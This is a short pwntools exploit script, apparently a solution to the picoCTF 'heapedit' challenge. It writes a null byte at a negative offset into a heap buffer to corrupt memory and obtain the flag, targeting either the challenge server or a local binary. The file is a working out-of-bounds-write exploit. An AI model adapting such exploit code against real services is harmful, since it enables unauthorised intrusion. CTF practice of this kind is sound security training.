#!/usr/bin/env python3
from pwn import *

PORT =  55330
HOST = "wily-courier.picoctf.net"
exe = context.binary = ELF('./heapedit_patched', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b*main+579
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# GDB()

idx = -5144;
value = '\x00';

p.sendlineafter(b"Address: ", str(idx))
p.sendlineafter(b"Value: ", value)


p.interactive()